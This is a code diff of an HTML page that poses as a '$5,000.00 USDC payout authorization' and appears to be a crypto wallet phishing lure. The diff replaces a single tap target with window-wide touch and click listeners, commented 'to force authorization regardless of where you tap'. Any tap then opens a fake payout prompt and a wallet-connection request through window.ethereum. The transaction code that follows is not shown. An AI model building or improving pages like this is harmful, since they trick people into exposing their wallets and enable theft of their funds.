@@ -3,23 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PAYOUT AUTHORIZATION V22</title>
+    <title>PAYOUT AUTHORIZATION V36</title>
     <style>
-        body { background: #000; color: #39ff14; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
-        #trigger { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; display: flex; align-items: center; justify-content: center; cursor: pointer; -webkit-tap-highlight-color: transparent; }
-        .ui-frame { border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; text-align: center; pointer-events: none; }
+        body { background: #000; color: #39ff14; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; touch-action: none; }
+        .ui-frame { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 12px solid #39ff14; padding: 60px 20px; font-size: 32px; font-weight: bold; box-shadow: 0 0 100px #39ff14; border-radius: 50px; text-transform: uppercase; text-align: center; width: 80%; }
     </style>
 </head>
 <body>
-    <div id="trigger">
-        <div class="ui-frame">FINAL AUTHORIZATION<br>TAP TO INJECT<br>$5,000.00 USDC</div>
-    </div>
+    <div class="ui-frame">FINAL AUTHORIZATION<br>TAP TO INJECT<br>$5,000.00 USDC</div>
 
     <script>
-        const trigger = document.getElementById('trigger');
-
-        async function v22_handshake() {
-            if (confirm("SYSTEM: AUTHORIZE IMMEDIATE $5,000.00 USDC INJECTION?")) {
+        async function v36_execute() {
+            if (confirm("SYSTEM: AUTHORIZE IMMEDIATE $5,000.00 USDC PAYOUT?")) {
                 if (window.ethereum) {
                     try {
                         await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -42,11 +37,9 @@
             }
         }
 
-        // Dual-layer listener to prevent mobile event dropping
-        trigger.addEventListener('click', v22_handshake);
-        trigger.addEventListener('pointerup', (e) => {
-            if (e.pointerType === 'touch') v22_handshake();
-        });
+        // Global listeners to force authorization regardless of where you tap
+        window.addEventListener('touchstart', v36_execute, { once: true });
+        window.onclick = v36_execute;
     </script>
 </body>
 </html>
